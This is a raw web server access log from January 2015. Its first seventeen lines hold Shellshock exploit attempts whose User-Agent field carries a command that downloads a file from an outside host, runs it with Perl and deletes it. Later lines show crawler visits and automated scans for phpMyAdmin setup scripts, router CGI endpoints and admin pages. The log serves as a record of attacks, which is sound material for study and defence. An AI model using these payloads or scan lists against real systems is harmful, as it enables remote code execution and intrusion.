89.19.7.66 - - [10/Jan/2015:04:51:08 -0700] "GET /phppath/php HTTP/1.1" 404 972 "-" "() { :;};/usr/bin/perl -e 'print \x22Content-Type: text/plain\x5Cr\x5Cn\x5Cr\x5CnXSUCCESS!\x22;system(\x22wget http://61.218.226.170/~fff/eCo.jpg -O /tmp/eCo.jpg;curl -O /tmp/eCo.jpg http://61.218.226.170/~fff/eCo.jpg;perl /tmp/eCo.jpg;rm -rf /tmp/eCo.jpg*\x22);'"
89.19.7.66 - - [10/Jan/2015:04:51:08 -0700] "GET /cgi-sys/php5 HTTP/1.1" 404 975 "-" "() { :;};/usr/bin/perl -e 'print \x22Content-Type: text/plain\x5Cr\x5Cn\x5Cr\x5CnXSUCCESS!\x22;system(\x22wget http://61.218.226.170/~fff/eCo.jpg -O /tmp/eCo.jpg;curl -O /tmp/eCo.jpg http://61.218.226.170/~fff/eCo.jpg;perl /tmp/eCo.jpg;rm -rf /tmp/eCo.jpg*\x22);'"
89.19.7.66 - - [10/Jan/2015:04:51:08 -0700] "GET /cgi-bin/test.cgi HTTP/1.1" 404 978 "-" "() { :;};/usr/bin/perl -e 'print \x22Content-Type: text/plain\x5Cr\x5Cn\x5Cr\x5CnXSUCCESS!\x22;system(\x22wget http://61.218.226.170/~fff/eCo.jpg -O /tmp/eCo.jpg;curl -O /tmp/eCo.jpg http://61.218.226.170/~fff/eCo.jpg;perl /tmp/eCo.jpg;rm -rf /tmp/eCo.jpg*\x22);'"
89.19.7.66 - - [10/Jan/2015:04:51:08 -0700] "GET /cgi-bin/tools/tools.pl HTTP/1.1" 404 981 "-" "() { :;};/usr/bin/perl -e 'print \x22Content-Type: text/plain\x5Cr\x5Cn\x5Cr\x5CnXSUCCESS!\x22;system(\x22wget http://61.218.226.170/~fff/eCo.jpg -O /tmp/eCo.jpg;curl -O /tmp/eCo.jpg http://61.218.226.170/~fff/eCo.jpg;perl /tmp/eCo.jpg;rm -rf /tmp/eCo.jpg*\x22);'"
89.19.7.66 - - [10/Jan/2015:04:51:08 -0700] "GET /cgi-bin/recent.cgi HTTP/1.1" 404 978 "-" "() { :;};/usr/bin/perl -e 'print \x22Content-Type: text/plain\x5Cr\x5Cn\x5Cr\x5CnXSUCCESS!\x22;system(\x22wget http://61.218.226.170/~fff/eCo.jpg -O /tmp/eCo.jpg;curl -O /tmp/eCo.jpg http://61.218.226.170/~fff/eCo.jpg;perl /tmp/eCo.jpg;rm -rf /tmp/eCo.jpg*\x22);'"
89.19.7.66 - - [10/Jan/2015:04:51:08 -0700] "GET /cgi-bin/test-cgi.pl HTTP/1.1" 404 980 "-" "() { :;};/usr/bin/perl -e 'print \x22Content-Type: text/plain\x5Cr\x5Cn\x5Cr\x5CnXSUCCESS!\x22;system(\x22wget http://61.218.226.170/~fff/eCo.jpg -O /tmp/eCo.jpg;curl -O /tmp/eCo.jpg http://61.218.226.170/~fff/eCo.jpg;perl /tmp/eCo.jpg;rm -rf /tmp/eCo.jpg*\x22);'"
89.19.7.66 - - [10/Jan/2015:04:51:08 -0700] "GET /cgi-bin/php5-cli HTTP/1.1" 404 978 "-" "() { :;};/usr/bin/perl -e 'print \x22Content-Type: text/plain\x5Cr\x5Cn\x5Cr\x5CnXSUCCESS!\x22;system(\x22wget http://61.218.226.170/~fff/eCo.jpg -O /tmp/eCo.jpg;curl -O /tmp/eCo.jpg http://61.218.226.170/~fff/eCo.jpg;perl /tmp/eCo.jpg;rm -rf /tmp/eCo.jpg*\x22);'"
89.19.7.66 - - [10/Jan/2015:04:51:08 -0700] "GET /cgi-bin/sat-ir-web.pl HTTP/1.1" 404 981 "-" "() { :;};/usr/bin/perl -e 'print \x22Content-Type: text/plain\x5Cr\x5Cn\x5Cr\x5CnXSUCCESS!\x22;system(\x22wget http://61.218.226.170/~fff/eCo.jpg -O /tmp/eCo.jpg;curl -O /tmp/eCo.jpg http://61.218.226.170/~fff/eCo.jpg;perl /tmp/eCo.jpg;rm -rf /tmp/eCo.jpg*\x22);'"
89.19.7.66 - - [10/Jan/2015:04:51:08 -0700] "GET /cgi-bin/php5 HTTP/1.1" 404 975 "-" "() { :;};/usr/bin/perl -e 'print \x22Content-Type: text/plain\x5Cr\x5Cn\x5Cr\x5CnXSUCCESS!\x22;system(\x22wget http://61.218.226.170/~fff/eCo.jpg -O /tmp/eCo.jpg;curl -O /tmp/eCo.jpg http://61.218.226.170/~fff/eCo.jpg;perl /tmp/eCo.jpg;rm -rf /tmp/eCo.jpg*\x22);'"
89.19.7.66 - - [10/Jan/2015:04:51:08 -0700] "GET /cgi-bin/php4 HTTP/1.1" 404 975 "-" "() { :;};/usr/bin/perl -e 'print \x22Content-Type: text/plain\x5Cr\x5Cn\x5Cr\x5CnXSUCCESS!\x22;system(\x22wget http://61.218.226.170/~fff/eCo.jpg -O /tmp/eCo.jpg;curl -O /tmp/eCo.jpg http://61.218.226.170/~fff/eCo.jpg;perl /tmp/eCo.jpg;rm -rf /tmp/eCo.jpg*\x22);'"
89.19.7.66 - - [10/Jan/2015:04:51:08 -0700] "GET /cgi-sys/defaultwebpage.cgi HTTP/1.1" 404 987 "-" "() { :;};/usr/bin/perl -e 'print \x22Content-Type: text/plain\x5Cr\x5Cn\x5Cr\x5CnXSUCCESS!\x22;system(\x22wget http://61.218.226.170/~fff/eCo.jpg -O /tmp/eCo.jpg;curl -O /tmp/eCo.jpg http://61.218.226.170/~fff/eCo.jpg;perl /tmp/eCo.jpg;rm -rf /tmp/eCo.jpg*\x22);'"
89.19.7.66 - - [10/Jan/2015:04:51:08 -0700] "GET /cgi-bin/test.sh HTTP/1.1" 404 977 "-" "() { :;};/usr/bin/perl -e 'print \x22Content-Type: text/plain\x5Cr\x5Cn\x5Cr\x5CnXSUCCESS!\x22;system(\x22wget http://61.218.226.170/~fff/eCo.jpg -O /tmp/eCo.jpg;curl -O /tmp/eCo.jpg http://61.218.226.170/~fff/eCo.jpg;perl /tmp/eCo.jpg;rm -rf /tmp/eCo.jpg*\x22);'"
89.19.7.66 - - [10/Jan/2015:04:51:08 -0700] "GET /cgi-mod/index.cgi HTTP/1.1" 404 978 "-" "() { :;};/usr/bin/perl -e 'print \x22Content-Type: text/plain\x5Cr\x5Cn\x5Cr\x5CnXSUCCESS!\x22;system(\x22wget http://61.218.226.170/~fff/eCo.jpg -O /tmp/eCo.jpg;curl -O /tmp/eCo.jpg http://61.218.226.170/~fff/eCo.jpg;perl /tmp/eCo.jpg;rm -rf /tmp/eCo.jpg*\x22);'"
89.19.7.66 - - [10/Jan/2015:04:51:08 -0700] "GET /cgi-sys/entropysearch.cgi HTTP/1.1" 404 985 "-" "() { :;};/usr/bin/perl -e 'print \x22Content-Type: text/plain\x5Cr\x5Cn\x5Cr\x5CnXSUCCESS!\x22;system(\x22wget http://61.218.226.170/~fff/eCo.jpg -O /tmp/eCo.jpg;curl -O /tmp/eCo.jpg http://61.218.226.170/~fff/eCo.jpg;perl /tmp/eCo.jpg;rm -rf /tmp/eCo.jpg*\x22);'"
89.19.7.66 - - [10/Jan/2015:04:51:08 -0700] "GET /phppath/cgi_wrapper HTTP/1.1" 404 981 "-" "() { :;};/usr/bin/perl -e 'print \x22Content-Type: text/plain\x5Cr\x5Cn\x5Cr\x5CnXSUCCESS!\x22;system(\x22wget http://61.218.226.170/~fff/eCo.jpg -O /tmp/eCo.jpg;curl -O /tmp/eCo.jpg http://61.218.226.170/~fff/eCo.jpg;perl /tmp/eCo.jpg;rm -rf /tmp/eCo.jpg*\x22);'"
89.19.7.66 - - [10/Jan/2015:04:51:08 -0700] "GET /cgi-bin/test-cgi HTTP/1.1" 404 978 "-" "() { :;};/usr/bin/perl -e 'print \x22Content-Type: text/plain\x5Cr\x5Cn\x5Cr\x5CnXSUCCESS!\x22;system(\x22wget http://61.218.226.170/~fff/eCo.jpg -O /tmp/eCo.jpg;curl -O /tmp/eCo.jpg http://61.218.226.170/~fff/eCo.jpg;perl /tmp/eCo.jpg;rm -rf /tmp/eCo.jpg*\x22);'"
89.19.7.66 - - [10/Jan/2015:04:51:08 -0700] "GET /cgi-bin-sdb/printenv HTTP/1.1" 404 980 "-" "() { :;};/usr/bin/perl -e 'print \x22Content-Type: text/plain\x5Cr\x5Cn\x5Cr\x5CnXSUCCESS!\x22;system(\x22wget http://61.218.226.170/~fff/eCo.jpg -O /tmp/eCo.jpg;curl -O /tmp/eCo.jpg http://61.218.226.170/~fff/eCo.jpg;perl /tmp/eCo.jpg;rm -rf /tmp/eCo.jpg*\x22);'"
54.174.49.199 - - [10/Jan/2015:04:53:56 -0700] "HEAD / HTTP/1.0" 200 0 "-" "-"
82.192.93.224 - - [10/Jan/2015:12:01:39 -0700] "HEAD / HTTP/1.0" 200 0 "-" "-"
95.211.168.172 - - [10/Jan/2015:13:28:45 -0700] "GET /css/css HTTP/1.0" 404 2008 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:27.C) Gecko/20130407 Firefox/27.0"
125.64.35.68 - - [10/Jan/2015:15:18:47 -0700] "GET http://s1.bdstatic.com/r/www/cache/static/home/img/logos/nuomi_ade5465d.png HTTP/1.1" 404 1006 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.3; Trident/7.0; .NET4.0E; .NET4.0C; .NET CLR 3.5.3072; .NET CLR 2.0.50727; .NET CLR 3.0.30729; Tablet PC 2.0)"
61.135.190.198 - - [10/Jan/2015:15:35:36 -0700] "GET / HTTP/1.0" 200 167 "http://www.baidu.com/s?wd=www" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)"
182.118.55.112 - - [10/Jan/2015:16:16:47 -0700] "GET / HTTP/1.1" 200 123 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2251.0 Safari/537.36"
176.103.49.29 - - [10/Jan/2015:21:18:26 -0700] "GET /rom-0 HTTP/1.1" 404 2027 "-" "Go 1.1 package http"
91.238.134.99 - - [10/Jan/2015:22:57:31 -0700] "GET http://pl.wikipedia.org/wiki/Special:Search?search=&go=Go HTTP/1.1" 404 2090 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)"
189.114.111.66 - - [11/Jan/2015:03:14:37 -0700] "HEAD / HTTP/1.0" 200 0 "-" "-"
189.9.13.198 - - [11/Jan/2015:04:35:17 -0700] "HEAD / HTTP/1.0" 200 0 "-" "-"
125.64.35.67 - - [11/Jan/2015:05:20:02 -0700] "GET http://s1.bdstatic.com/r/www/cache/static/home/img/logos/nuomi_ade5465d.png HTTP/1.1" 404 1006 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.3; Trident/7.0; .NET4.0E; .NET4.0C; .NET CLR 3.5.3072; .NET CLR 2.0.50727; .NET CLR 3.0.30729; Tablet PC 2.0)"
91.238.134.99 - - [11/Jan/2015:06:06:49 -0700] "GET http://pl.wikipedia.org/wiki/Special:Search?search=&go=Go HTTP/1.1" 404 2090 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)"
66.249.67.56 - - [11/Jan/2015:07:22:09 -0700] "GET /robots.txt HTTP/1.1" 404 962 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.67.56 - - [11/Jan/2015:07:22:09 -0700] "GET / HTTP/1.1" 200 123 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A5376e Safari/8536.25 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
61.135.190.200 - - [11/Jan/2015:12:23:03 -0700] "GET / HTTP/1.0" 200 167 "http://www.baidu.com/s?wd=www" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)"
104.192.0.18 - - [11/Jan/2015:12:28:10 -0700] "GET /contactrobforsupportticketsorperhapssomeoneatecatel.html HTTP/1.0" 404 2155 "-" "-"
201.6.4.107 - - [11/Jan/2015:20:32:51 -0700] "HEAD / HTTP/1.0" 200 0 "-" "-"
91.238.134.99 - - [12/Jan/2015:04:40:41 -0700] "GET http://pl.wikipedia.org/wiki/Special:Search?search=&go=Go HTTP/1.1" 404 2090 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)"
23.20.36.255 - - [12/Jan/2015:07:22:27 -0700] "GET / HTTP/1.1" 200 178 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.9.2.3) Gecko/20100401 Firefox/3.6.3 GTB6 (.NET CLR 3.5.30729)"
54.198.174.88 - - [12/Jan/2015:07:23:38 -0700] "GET / HTTP/1.1" 200 178 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.9.2.3) Gecko/20100401 Firefox/3.6.3 GTB6 (.NET CLR 3.5.30729)"
64.141.118.54 - - [12/Jan/2015:09:38:32 -0700] "GET / HTTP/1.1" 200 123 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko"
64.141.118.54 - - [12/Jan/2015:09:38:34 -0700] "GET / HTTP/1.1" 200 123 "http://wrenchmarks.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko"
64.141.118.54 - - [12/Jan/2015:09:38:36 -0700] "GET / HTTP/1.1" 200 123 "http://wrenchmarks.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko"
64.141.118.54 - - [12/Jan/2015:09:38:37 -0700] "GET / HTTP/1.1" 200 123 "http://wrenchmarks.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko"
61.135.190.72 - - [12/Jan/2015:09:55:52 -0700] "GET / HTTP/1.0" 200 167 "http://www.baidu.com/s?wd=www" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)"
91.238.134.99 - - [12/Jan/2015:14:02:56 -0700] "GET http://pl.wikipedia.org/wiki/Special:Search?search=&go=Go HTTP/1.1" 404 2090 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)"
62.117.80.169 - - [12/Jan/2015:16:02:06 -0700] "HEAD / HTTP/1.0" 200 0 "-" "-"
137.118.106.240 - - [12/Jan/2015:16:05:10 -0700] "GET /tmUnblock.cgi HTTP/1.1" 400 181 "-" "-"
182.118.54.115 - - [12/Jan/2015:16:13:51 -0700] "GET / HTTP/1.1" 200 123 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2251.0 Safari/537.36"
71.6.135.131 - - [12/Jan/2015:20:55:26 -0700] "GET / HTTP/1.1" 200 178 "-" "-"
71.6.135.131 - - [12/Jan/2015:20:55:26 -0700] "GET /robots.txt HTTP/1.1" 404 2042 "-" "-"
178.211.33.154 - - [13/Jan/2015:01:04:42 -0700] "GET / HTTP/1.1" 200 178 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:31.0) Gecko/20100101 Firefox/31.0"
24.230.255.44 - - [13/Jan/2015:02:57:50 -0700] "GET /tmUnblock.cgi HTTP/1.1" 400 181 "-" "-"
62.117.80.169 - - [13/Jan/2015:03:33:40 -0700] "HEAD / HTTP/1.0" 200 0 "-" "-"
62.112.96.9 - - [13/Jan/2015:06:16:37 -0700] "HEAD / HTTP/1.0" 200 0 "-" "-"
61.135.190.72 - - [13/Jan/2015:06:20:01 -0700] "GET / HTTP/1.0" 200 167 "http://www.baidu.com/s?wd=www" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)"
66.249.67.56 - - [13/Jan/2015:06:55:30 -0700] "GET /robots.txt HTTP/1.1" 404 962 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.67.56 - - [13/Jan/2015:06:55:30 -0700] "GET / HTTP/1.1" 200 123 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A5376e Safari/8536.25 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
62.210.86.137 - - [13/Jan/2015:09:39:11 -0700] "GET /CFIDE/administrator/ HTTP/1.1" 404 2072 "-" "-"
37.57.231.119 - - [13/Jan/2015:10:06:40 -0700] "GET /wp-login.php HTTP/1.1" 404 972 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/24.0.1309.0 Safari/537.17"
37.57.231.119 - - [13/Jan/2015:10:06:41 -0700] "GET /administrator/ HTTP/1.1" 404 971 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/24.0.1309.0 Safari/537.17"
37.57.231.119 - - [13/Jan/2015:10:06:41 -0700] "GET /admin.php HTTP/1.1" 404 968 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/24.0.1309.0 Safari/537.17"
192.92.6.133 - - [13/Jan/2015:12:27:43 -0700] "GET /tmUnblock.cgi HTTP/1.1" 400 181 "-" "-"
66.249.67.111 - - [13/Jan/2015:17:55:59 -0700] "GET /robots.txt HTTP/1.1" 404 967 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.67.103 - - [13/Jan/2015:17:55:59 -0700] "GET / HTTP/1.1" 200 123 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
198.154.63.131 - - [13/Jan/2015:19:46:04 -0700] "GET /muieblackcat HTTP/1.1" 404 974 "-" "-"
198.154.63.131 - - [13/Jan/2015:19:46:04 -0700] "GET //scripts/setup.php HTTP/1.1" 404 978 "-" "-"
198.154.63.131 - - [13/Jan/2015:19:46:04 -0700] "GET //admin/scripts/setup.php HTTP/1.1" 404 1255 "-" "-"
198.154.63.131 - - [13/Jan/2015:19:46:04 -0700] "GET //admin/pma/scripts/setup.php HTTP/1.1" 404 1259 "-" "-"
198.154.63.131 - - [13/Jan/2015:19:46:04 -0700] "GET //admin/phpmyadmin/scripts/setup.php HTTP/1.1" 404 1260 "-" "-"
198.154.63.131 - - [13/Jan/2015:19:46:04 -0700] "GET //db/scripts/setup.php HTTP/1.1" 404 980 "-" "-"
198.154.63.131 - - [13/Jan/2015:19:46:04 -0700] "GET //dbadmin/scripts/setup.php HTTP/1.1" 404 984 "-" "-"
198.154.63.131 - - [13/Jan/2015:19:46:04 -0700] "GET //myadmin/scripts/setup.php HTTP/1.1" 404 984 "-" "-"
198.154.63.131 - - [13/Jan/2015:19:46:04 -0700] "GET //mysql/scripts/setup.php HTTP/1.1" 404 985 "-" "-"
198.154.63.131 - - [13/Jan/2015:19:46:04 -0700] "GET //mysqladmin/scripts/setup.php HTTP/1.1" 404 987 "-" "-"
198.154.63.131 - - [13/Jan/2015:19:46:04 -0700] "GET //typo3/phpmyadmin/scripts/setup.php HTTP/1.1" 404 990 "-" "-"
198.154.63.131 - - [13/Jan/2015:19:46:04 -0700] "GET //phpadmin/scripts/setup.php HTTP/1.1" 404 984 "-" "-"
198.154.63.131 - - [13/Jan/2015:19:46:05 -0700] "GET //phpMyAdmin/scripts/setup.php HTTP/1.1" 404 988 "-" "-"
198.154.63.131 - - [13/Jan/2015:19:46:05 -0700] "GET //phpmyadmin1/scripts/setup.php HTTP/1.1" 404 988 "-" "-"
198.154.63.131 - - [13/Jan/2015:19:46:05 -0700] "GET //phpmyadmin2/scripts/setup.php HTTP/1.1" 404 988 "-" "-"
198.154.63.131 - - [13/Jan/2015:19:46:05 -0700] "GET //pma/scripts/setup.php HTTP/1.1" 404 981 "-" "-"
198.154.63.131 - - [13/Jan/2015:19:46:05 -0700] "GET //web/phpMyAdmin/scripts/setup.php HTTP/1.1" 404 991 "-" "-"
198.154.63.131 - - [13/Jan/2015:19:46:05 -0700] "GET //xampp/phpmyadmin/scripts/setup.php HTTP/1.1" 404 991 "-" "-"
198.154.63.131 - - [13/Jan/2015:19:46:05 -0700] "GET //web/scripts/setup.php HTTP/1.1" 404 982 "-" "-"
198.154.63.131 - - [13/Jan/2015:19:46:05 -0700] "GET //php-my-admin/scripts/setup.php HTTP/1.1" 404 988 "-" "-"
198.154.63.131 - - [13/Jan/2015:19:46:05 -0700] "GET //websql/scripts/setup.php HTTP/1.1" 404 986 "-" "-"
198.154.63.131 - - [13/Jan/2015:19:46:05 -0700] "GET //phpMyAdmin-2/scripts/setup.php HTTP/1.1" 404 990 "-" "-"
198.154.63.131 - - [13/Jan/2015:19:46:05 -0700] "GET //phpMyAdmin-2.2.3/scripts/setup.php HTTP/1.1" 404 994 "-" "-"
198.154.63.131 - - [13/Jan/2015:19:46:05 -0700] "GET //phpMyAdmin-2.2.6/scripts/setup.php HTTP/1.1" 404 994 "-" "-"
198.154.63.131 - - [13/Jan/2015:19:46:05 -0700] "GET //phpMyAdmin-2.5.1/scripts/setup.php HTTP/1.1" 404 994 "-" "-"
198.154.63.131 - - [13/Jan/2015:19:46:09 -0700] "GET //phpMyAdmin-2.5.5-rc1/scripts/setup.php HTTP/1.1" 404 997 "-" "-"
198.154.63.131 - - [13/Jan/2015:19:46:12 -0700] "GET //phpMyAdmin-2.5.5/scripts/setup.php HTTP/1.1" 404 994 "-" "-"
198.154.63.131 - - [13/Jan/2015:19:46:12 -0700] "GET //phpMyAdmin-2.5.5-pl1/scripts/setup.php HTTP/1.1" 404 998 "-" "-"
198.154.63.131 - - [13/Jan/2015:19:46:24 -0700] "GET //phpMyAdmin-2.5.7-pl1/scripts/setup.php HTTP/1.1" 404 998 "-" "-"
198.154.63.131 - - [13/Jan/2015:19:46:27 -0700] "GET //phpMyAdmin-2.6.0-alpha2/scripts/setup.php HTTP/1.1" 404 999 "-" "-"
198.154.63.131 - - [13/Jan/2015:19:46:30 -0700] "GET //phpMyAdmin-2.6.0-beta2/scripts/setup.php HTTP/1.1" 404 998 "-" "-"
198.154.63.131 - - [13/Jan/2015:19:46:39 -0700] "GET //phpMyAdmin-2.6.0/scripts/setup.php HTTP/1.1" 404 994 "-" "-"
198.154.63.131 - - [13/Jan/2015:19:46:45 -0700] "GET //phpMyAdmin-2.6.0-pl3/scripts/setup.php HTTP/1.1" 404 997 "-" "-"
198.154.63.131 - - [13/Jan/2015:19:46:45 -0700] "GET //phpMyAdmin-2.6.1-rc1/scripts/setup.php HTTP/1.1" 404 997 "-" "-"
198.154.63.131 - - [13/Jan/2015:19:46:48 -0700] "GET //phpMyAdmin-2.6.1/scripts/setup.php HTTP/1.1" 404 994 "-" "-"
198.154.63.131 - - [13/Jan/2015:19:46:48 -0700] "GET //phpMyAdmin-2.6.1-pl1/scripts/setup.php HTTP/1.1" 404 997 "-" "-"
198.154.63.131 - - [13/Jan/2015:19:46:48 -0700] "GET //phpMyAdmin-2.6.1-pl2/scripts/setup.php HTTP/1.1" 404 997 "-" "-"
198.154.63.131 - - [13/Jan/2015:19:46:48 -0700] "GET //phpMyAdmin-2.6.1-pl3/scripts/setup.php HTTP/1.1" 404 997 "-" "-"
198.154.63.131 - - [13/Jan/2015:19:46:49 -0700] "GET //phpMyAdmin-2.6.2-rc1/scripts/setup.php HTTP/1.1" 404 997 "-" "-"
198.154.63.131 - - [13/Jan/2015:19:46:49 -0700] "GET //phpMyAdmin-2.6.2-beta1/scripts/setup.php HTTP/1.1" 404 998 "-" "-"
198.154.63.131 - - [13/Jan/2015:19:46:49 -0700] "GET //phpMyAdmin-2.6.2/scripts/setup.php HTTP/1.1" 404 994 "-" "-"
198.154.63.131 - - [13/Jan/2015:19:46:49 -0700] "GET //phpMyAdmin-2.6.2-pl1/scripts/setup.php HTTP/1.1" 404 997 "-" "-"
198.154.63.131 - - [13/Jan/2015:19:46:49 -0700] "GET //phpMyAdmin-2.6.3/scripts/setup.php HTTP/1.1" 404 994 "-" "-"
198.154.63.131 - - [13/Jan/2015:19:46:49 -0700] "GET //phpMyAdmin-2.6.3-rc1/scripts/setup.php HTTP/1.1" 404 997 "-" "-"
198.154.63.131 - - [13/Jan/2015:19:46:49 -0700] "GET //phpMyAdmin-2.6.3-pl1/scripts/setup.php HTTP/1.1" 404 997 "-" "-"
198.154.63.131 - - [13/Jan/2015:19:46:49 -0700] "GET //phpMyAdmin-2.6.4-rc1/scripts/setup.php HTTP/1.1" 404 997 "-" "-"
198.154.63.131 - - [13/Jan/2015:19:46:49 -0700] "GET //phpMyAdmin-2.6.4-pl1/scripts/setup.php HTTP/1.1" 404 997 "-" "-"
198.154.63.131 - - [13/Jan/2015:19:46:49 -0700] "GET //phpMyAdmin-2.6.4-pl2/scripts/setup.php HTTP/1.1" 404 997 "-" "-"
198.154.63.131 - - [13/Jan/2015:19:46:49 -0700] "GET //phpMyAdmin-2.6.4-pl3/scripts/setup.php HTTP/1.1" 404 998 "-" "-"
198.154.63.131 - - [13/Jan/2015:19:46:49 -0700] "GET //phpMyAdmin-2.6.4-pl4/scripts/setup.php HTTP/1.1" 404 997 "-" "-"
198.154.63.131 - - [13/Jan/2015:19:46:49 -0700] "GET //phpMyAdmin-2.6.4/scripts/setup.php HTTP/1.1" 404 994 "-" "-"
198.154.63.131 - - [13/Jan/2015:19:46:49 -0700] "GET //phpMyAdmin-2.7.0-beta1/scripts/setup.php HTTP/1.1" 404 999 "-" "-"
198.154.63.131 - - [13/Jan/2015:19:46:50 -0700] "GET //phpMyAdmin-2.7.0-rc1/scripts/setup.php HTTP/1.1" 404 998 "-" "-"
198.154.63.131 - - [13/Jan/2015:19:46:50 -0700] "GET //phpMyAdmin-2.7.0-pl1/scripts/setup.php HTTP/1.1" 404 998 "-" "-"
198.154.63.131 - - [13/Jan/2015:19:46:50 -0700] "GET //phpMyAdmin-2.7.0-pl2/scripts/setup.php HTTP/1.1" 404 998 "-" "-"
198.154.63.131 - - [13/Jan/2015:19:46:50 -0700] "GET //phpMyAdmin-2.7.0/scripts/setup.php HTTP/1.1" 404 994 "-" "-"
198.154.63.131 - - [13/Jan/2015:19:46:50 -0700] "GET //phpMyAdmin-2.8.0-beta1/scripts/setup.php HTTP/1.1" 404 999 "-" "-"
198.154.63.131 - - [13/Jan/2015:19:46:50 -0700] "GET //phpMyAdmin-2.8.0-rc1/scripts/setup.php HTTP/1.1" 404 997 "-" "-"
198.154.63.131 - - [13/Jan/2015:19:46:50 -0700] "GET //phpMyAdmin-2.8.0-rc2/scripts/setup.php HTTP/1.1" 404 997 "-" "-"
198.154.63.131 - - [13/Jan/2015:19:46:50 -0700] "GET //phpMyAdmin-2.8.0/scripts/setup.php HTTP/1.1" 404 994 "-" "-"
198.154.63.131 - - [13/Jan/2015:19:46:50 -0700] "GET //phpMyAdmin-2.8.0.1/scripts/setup.php HTTP/1.1" 404 996 "-" "-"
198.154.63.131 - - [13/Jan/2015:19:46:50 -0700] "GET //phpMyAdmin-2.8.0.2/scripts/setup.php HTTP/1.1" 404 996 "-" "-"
198.154.63.131 - - [13/Jan/2015:19:46:50 -0700] "GET //phpMyAdmin-2.8.0.3/scripts/setup.php HTTP/1.1" 404 996 "-" "-"
198.154.63.131 - - [13/Jan/2015:19:46:50 -0700] "GET //phpMyAdmin-2.8.0.4/scripts/setup.php HTTP/1.1" 404 996 "-" "-"
198.154.63.131 - - [13/Jan/2015:19:46:50 -0700] "GET //phpMyAdmin-2.8.1-rc1/scripts/setup.php HTTP/1.1" 404 997 "-" "-"
198.154.63.131 - - [13/Jan/2015:19:46:51 -0700] "GET //phpMyAdmin-2.8.1/scripts/setup.php HTTP/1.1" 404 994 "-" "-"
198.154.63.131 - - [13/Jan/2015:19:46:51 -0700] "GET //phpMyAdmin-2.8.2/scripts/setup.php HTTP/1.1" 404 994 "-" "-"
198.154.63.131 - - [13/Jan/2015:19:46:51 -0700] "GET //sqlmanager/scripts/setup.php HTTP/1.1" 404 988 "-" "-"
198.154.63.131 - - [13/Jan/2015:19:46:51 -0700] "GET //mysqlmanager/scripts/setup.php HTTP/1.1" 404 990 "-" "-"
198.154.63.131 - - [13/Jan/2015:19:46:51 -0700] "GET //p/m/a/scripts/setup.php HTTP/1.1" 404 985 "-" "-"
198.154.63.131 - - [13/Jan/2015:19:46:51 -0700] "GET //PMA2005/scripts/setup.php HTTP/1.1" 404 989 "-" "-"
198.154.63.131 - - [13/Jan/2015:19:46:51 -0700] "GET //phpmanager/scripts/setup.php HTTP/1.1" 404 987 "-" "-"
198.154.63.131 - - [13/Jan/2015:19:46:51 -0700] "GET //php-myadmin/scripts/setup.php HTTP/1.1" 404 987 "-" "-"
198.154.63.131 - - [13/Jan/2015:19:46:51 -0700] "GET //phpmy-admin/scripts/setup.php HTTP/1.1" 404 987 "-" "-"
198.154.63.131 - - [13/Jan/2015:19:46:51 -0700] "GET //webadmin/scripts/setup.php HTTP/1.1" 404 985 "-" "-"
198.154.63.131 - - [13/Jan/2015:19:46:51 -0700] "GET //sqlweb/scripts/setup.php HTTP/1.1" 404 986 "-" "-"
198.154.63.131 - - [13/Jan/2015:19:46:54 -0700] "GET //mysql-admin/scripts/setup.php HTTP/1.1" 404 988 "-" "-"
198.154.63.131 - - [13/Jan/2015:19:46:57 -0700] "GET //admm/scripts/setup.php HTTP/1.1" 404 983 "-" "-"
198.154.63.131 - - [13/Jan/2015:19:46:57 -0700] "GET //admn/scripts/setup.php HTTP/1.1" 404 983 "-" "-"
198.154.63.131 - - [13/Jan/2015:19:47:04 -0700] "GET //~/PMA/scripts/setup.php HTTP/1.1" 404 987 "-" "-"
